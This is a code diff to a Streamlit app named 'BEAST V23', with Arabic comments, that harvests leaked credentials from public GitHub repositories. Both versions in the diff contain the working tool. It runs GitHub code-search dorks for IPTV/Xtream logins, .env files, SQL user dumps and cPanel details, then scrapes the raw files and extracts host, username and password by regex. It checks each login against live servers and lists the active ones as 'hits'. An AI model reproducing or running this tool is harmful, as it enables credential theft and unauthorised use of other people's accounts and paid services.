@@ -5,14 +5,14 @@ import time
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-st.set_page_config(page_title="BEAST V23 - ULTRA SCANNER", layout="wide")
+st.set_page_config(page_title="BEAST V23 - STABLE SCANNER", layout="wide")
 
 # --- نظام الدخول ---
 if "auth" not in st.session_state:
     st.session_state.auth = False
 
 if not st.session_state.auth:
-    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V23 - ULTRA SPEED</h1>", unsafe_allow_html=True)
+    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V23 - STABLE SCAN</h1>", unsafe_allow_html=True)
     pwd = st.text_input("Password:", type="password")
     if st.button("دخول"):
         if pwd == "BEAST_V17_PRO":
@@ -20,86 +20,54 @@ if not st.session_state.auth:
             st.rerun()
     st.stop()
 
-# --- التنسيق البصري ---
+# --- التنسيق ---
 st.markdown("""
 <style>
-    .stApp { background-color: #060606; }
-    .scan-log { color: #00d4ff; font-family: monospace; font-size: 12px; margin: 0; }
+    .stApp { background-color: #050505; }
     .active-hit {
-        background: linear-gradient(90deg, #0d1117, #001a00); 
-        border-left: 5px solid #00ff41;
-        padding: 15px; border-radius: 8px; margin-bottom: 10px;
-        box-shadow: 0 4px 15px rgba(0, 255, 65, 0.1);
+        background: #0d1117; border-left: 5px solid #00ff41;
+        padding: 12px; border-radius: 5px; margin-bottom: 8px;
     }
-    .text-green { color: #00ff41; font-weight: bold; font-size: 1.1em; }
-    .text-yellow { color: #fbbf24; }
-    .text-white { color: #e5e7eb; font-family: 'Courier New', monospace; }
-    .stButton>button { width: 100%; background: #00ff41; color: black; font-weight: bold; }
+    .text-green { color: #00ff41; font-weight: bold; }
 </style>
 """, unsafe_allow_html=True)
 
 with st.sidebar:
-    st.title("⚡ BEAST V23 ULTRA")
-    token = st.text_input("GitHub Token:", type="password", help="ضع توكن جيت هاب هنا لتجنب الحظر")
-    max_workers = st.slider("سرعة الخيوط (Threads)", 10, 100, 40)
-    timeout_val = st.slider("مهلة الرد (Timeout)", 1, 10, 3)
-    start = st.button("🚀 إطلاق الهجوم الشامل")
-    st.warning("ملاحظة: جيت هاب تسمح بحد أقصى 1000 نتيجة لكل بحث.")
+    st.title("⚡ BEAST V23 STABLE")
+    token = st.text_input("GitHub Token:", type="password")
+    max_workers = st.slider("سرعة فحص الروابط", 10, 50, 25)
+    start = st.button("🚀 ابدأ الفحص المستقر")
+    st.info("تم إبطاء البحث قليلاً لتجنب حظر GitHub API")
 
-st.subheader("📡 رادار البحث المباشر")
+st.subheader("📡 حالة الرادار")
 radar_area = st.empty()
-
-st.subheader("🏆 النتائج المكتشفة (HITS)")
 hits_area = st.container()
 
-# --- دالة الفحص الذكي ---
-def check_server(session, host, user, pw, timeout):
+def check_server(host, user, pw):
+    """فحص السيرفر بشكل منفصل وسريع"""
     try:
         check_url = f"{host}/player_api.php?username={user}&password={pw}"
-        r = session.get(check_url, timeout=timeout)
-        data = r.json()
-        if data.get("user_info", {}).get("status") == "Active":
-            exp_date = data.get("user_info", {}).get("exp_date")
-            if exp_date:
-                dt = datetime.fromtimestamp(int(exp_date)).strftime('%Y-%m-%d')
-            else:
-                dt = "Unlimited"
-            return {"status": "Active", "exp": dt}
+        r = requests.get(check_url, timeout=4)
+        if r.status_code == 200:
+            data = r.json()
+            if data.get("user_info", {}).get("status") == "Active":
+                return True, data.get("user_info", {}).get("exp_date", "N/A")
     except:
         pass
-    return None
+    return False, None
 
 if start and token:
-    session = requests.Session()
-    session.headers.update({'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'})
-
-    # --- قائمة دروكس موسعة جداً (IPTV / Xtream / Portals) ---
+    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
+    
     dorks = [
         'extension:txt "get.php?username=" "password="',
         'extension:m3u "player_api.php"',
         'extension:php "username" "password" "server" "port"',
-        'extension:json "server" "username" "password"',
-        'extension:cfg "xtream" "user" "pass"',
-        'extension:conf "enigma2" "http" "user"',
         'extension:txt "http://" "user" "pass" "panel"',
+        'extension:json "server" "username" "password"',
         'path:.env "XTREAM"',
-        'extension:sql "INSERT INTO users" "password"',
-        'extension:txt "cpanel" "host" "user" "pass"',
-        'extension:ini "portal" "username"',
         'extension:txt "http://" "8080" "username" "password"',
-        'extension:txt "http://" "25461" "username" "password"',
-        '"player_api.php?username=" extension:php',
-        'extension:m3u "http://" "user=" "pass="',
-        'extension:txt "dns" "port" "username" "password"',
-        'filename:settings.xml "xtream-codes"',
-        'extension:log "login" "password" "iptv"',
-        'extension:txt "panel_api.php?username="',
-        'extension:py "xtream" "username" "password"',
-        'extension:sh "http://" "user" "pass"',
-        'extension:txt "http://" "2086" "username" "password"',
-        'extension:txt "http://" "2095" "username" "password"',
-        'extension:txt "http://" "8000" "username" "password"',
-        'extension:txt "/live/" "username" "password"',
+        '"player_api.php?username=" extension:php'
     ]
 
     found_count = 0
@@ -107,63 +75,63 @@ if start and token:
 
     for dork in dorks:
         page = 1
-        max_pages = 10 # جيت هاب لا تعطي أكثر من 1000 نتيجة (10 صفحات × 100)
-        
-        while page <= max_pages:
+        while page <= 5:  # فحص أول 5 صفحات من كل دورك لضمان السرعة
+            search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=50"
             try:
-                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
-                res = session.get(search_url).json()
-
-                if "items" not in res:
-                    radar_area.warning(f"⚠️ Rate limit! ننتظر 20 ثانية لتجنب الحظر...")
-                    time.sleep(20)
+                response = requests.get(search_url, headers=headers)
+                
+                if response.status_code == 401:
+                    st.error("❌ التوكن (Token) غير صحيح أو انتهت صلاحيته!")
+                    st.stop()
+                elif response.status_code == 403:
+                    radar_area.warning(f"⏳ GitHub طلب استراحة.. هننتظر ثواني ونكمل (Dork: {dork[:20]})")
+                    time.sleep(30) # زيادة مدة الانتظار لتجاوز الحظر
                     continue
-
+                
+                res = response.json()
                 items = res.get("items", [])
                 if not items: break
 
-                radar_area.info(f"🔎 Dork: {dork[:30]}.. | الصفحة: {page} | الملفات: {len(items)}")
+                radar_area.info(f"🔎 فحص: {dork[:30]}.. | صفحة: {page}")
 
-                # استخراج الروابط الخام دفعة واحدة
-                raw_urls = [item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/') for item in items]
+                # تجميع الروابط الخام
+                raw_urls = []
+                for item in items:
+                    raw = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
+                    raw_urls.append(raw)
 
-                def process_file(url):
+                # فحص محتوى الملفات
+                def process_url(url):
                     try:
                         content = requests.get(url, timeout=5).text
-                        # Regex مطور لجلب كل الصيغ الممكنة للروابط واليوزرات
-                        pattern = r"(https?://[a-zA-Z0-9\.-]+:\d+)/[a-zA-Z\._-]+\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)"
-                        return re.findall(pattern, content)
+                        matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:\d+)/[a-zA-Z\._-]+\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
+                        return matches
                     except: return []
 
-                # فحص الملفات بالتوازي
                 with ThreadPoolExecutor(max_workers=max_workers) as executor:
-                    futures = {executor.submit(process_file, url): url for url in raw_urls}
-                    for future in as_completed(futures):
-                        results = future.result()
-                        for host, user, pw in results:
-                            # فحص السيرفر فوراً إذا كان شغال
-                            check = check_server(session, host, user, pw, timeout_val)
-                            if check:
+                    future_to_url = {executor.submit(process_url, url): url for url in raw_urls}
+                    for future in as_completed(future_to_url):
+                        creds = future.result()
+                        for host, user, pw in creds:
+                            # فحص الحساب شغال ولا لأ
+                            is_active, exp = check_server(host, user, pw)
+                            if is_active:
                                 found_count += 1
-                                hit_text = f"""
-                                <div class="active-hit">
-                                    <span class="text-green">✅ HIT #{found_count} - ACTIVE</span><br>
-                                    <span class="text-white"><b>HOST:</b> {host}</span><br>
-                                    <span class="text-yellow"><b>USER:</b> {user} | <b>PASS:</b> {pw}</span><br>
-                                    <span class="text-white" style="font-size:0.8em;">📅 EXPIRY: {check['exp']}</span>
-                                </div>
-                                """
                                 with hits_area:
-                                    st.markdown(hit_text, unsafe_allow_html=True)
-                                hits_list.append(f"{host}|{user}|{pw}|EXP:{check['exp']}")
+                                    st.markdown(f"""
+                                    <div class="active-hit">
+                                        <span class="text-green">✅ HIT #{found_count}</span><br>
+                                        <span style="color:white;">{host} | {user}:{pw}</span><br>
+                                        <span style="color:gray; font-size:12px;">Expiry: {exp}</span>
+                                    </div>
+                                    """, unsafe_allow_html=True)
+                                hits_list.append(f"{host}|{user}|{pw}")
 
                 page += 1
-                time.sleep(1) # تأخير بسيط لتجنب حظر IP
+                time.sleep(2) # تأخير بسيط بين الصفحات عشان جيت هاب ميزعلش
 
             except Exception as e:
-                radar_area.error(f"Error: {str(e)}")
+                radar_area.error(f"حدث خطأ: {e}")
                 time.sleep(5)
 
-    st.success(f"🏁 انتهى البحث العظيم! تم العثور على {found_count} حساب شغال.")
-    if hits_list:
-        st.download_button("📥 تحميل ملف الهيتات", "\n".join(hits_list), "beast_ultra_hits.txt")
+    st.success(f"✅ خلصنا! جمعنا {found_count} حساب.")
